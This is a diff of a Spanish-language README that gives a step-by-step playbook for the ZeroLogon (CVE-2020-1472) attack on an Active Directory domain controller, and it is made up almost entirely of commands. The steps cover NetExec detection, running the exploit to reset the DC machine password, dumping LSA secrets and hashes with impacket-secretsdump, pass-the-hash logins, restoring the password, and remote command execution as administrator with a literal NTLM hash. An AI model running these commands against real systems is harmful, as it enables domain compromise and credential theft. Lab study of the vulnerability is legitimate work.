@@ -25,13 +25,13 @@ Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** ut
 ### 1. Verificar conectividad SMB con el DC
 
 ```bash
-nxc smb [IP_DEL_SERVER_AD]
+nxc smb [IP_DEL_DC]
 ```
 
 Repetir si es necesario para confirmar acceso:
 
 ```bash
-nxc smb [IP_DEL_SERVER_AD]
+nxc smb [IP_DEL_DC]
 ```
 
 ---
@@ -39,7 +39,9 @@ nxc smb [IP_DEL_SERVER_AD]
 ### 2. Explotar ZeroLogon con NetExec
 
 ```bash
-nxc smb [IP_DEL_SERVER_AD] -u '' -p '' -M zerologon
+nxc smb [IP_DEL_DC] -u '' -p '' -M zerologon
+
+CHECKEAR esto y si es vulnerable.... lo siguiente
 ```
 
 Este módulo intenta autenticar usando claves nulas y explotar la vulnerabilidad en Netlogon.
@@ -58,13 +60,13 @@ cd CVE-2020-1472
 ### 4. Cambiar la contraseña de la cuenta de equipo del DC
 
 ```bash
-python3 cve-2020-1472-exploit.py
+python3 cve-2020-1472-exploit.py (para ver si no hay que instalar añgun requisito)
 ```
 
 O usar argumentos manuales:
 
 ```bash
-python3 cve-2020-1472-exploit.py -t [IP_DEL_SERVER_AD] -n [NOMBRE_DEL_SERVER_AD]
+python3 cve-2020-1472-exploit.py -t [IP_DEL_DC] -n [NOMBRE_DEL_DC]
 ```
 
 ---
@@ -72,23 +74,23 @@ python3 cve-2020-1472-exploit.py -t [IP_DEL_SERVER_AD] -n [NOMBRE_DEL_SERVER_AD]
 ### 5. Volcar hashes con Impacket
 
 ```bash
-impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SERVER_AD]'
+impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ```
 
 Esto permite obtener los secretos de LSA y hash de administrador.
 
 ---
 
-### 6. Validar acceso como máquina y luego como administrador
+### 6. Validar acceso como máquina y luego como administrador (Para dumpear hex de maquina para recuperar contraseña)
 
 ```bash
-nxc smb [IP_DEL_SERVER_AD] -u '[NOMBRE_DEL_SERVER_AD]$' -p '' --lsa
+nxc smb [IP_DEL_DC] -u '[NOMBRE_DEL_DC]$' -p '' --lsa
 ```
 
 Con hash de administrador (por ejemplo):
 
 ```bash
-nxc smb [IP_DEL_SERVER_AD] -u '[USUARIO_ADMINISTRADOR]' -H '[HASH_DE_ADMINISTRADOR]' --lsa
+nxc smb [IP_DEL_DC] -u '[USUARIO_ADMINISTRADOR]' -H '[HASH_DE_ADMINISTRADOR]' --lsa
 ```
 
 ---
@@ -102,7 +104,7 @@ python3 reinstall_original_pw.py
 O con argumentos:
 
 ```bash
-python3 reinstall_original_pw.py [NOMBRE_DEL_SERVER_AD]$ [IP_DEL_SERVER_AD] [HASH_LARGO]
+python3 reinstall_original_pw.py [NOMBRE_DEL_DC]$ [IP_DEL_DC] [HEX DE CONTRASEÑA DEL DC]
 ```
 
 ---
@@ -110,7 +112,7 @@ python3 reinstall_original_pw.py [NOMBRE_DEL_SERVER_AD]$ [IP_DEL_SERVER_AD] [HAS
 ### 8. Validar acceso final con hash NTLM
 
 ```bash
-impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SERVER_AD]'
+impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ```
 
 ---
@@ -118,7 +120,7 @@ impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SE
 ### 9. Ejecutar comando remoto como administrador
 
 ```bash
-nxc smb [IP_DEL_SERVER_AD] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
+nxc smb [IP_DEL_DC] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
 ```
 
 ---
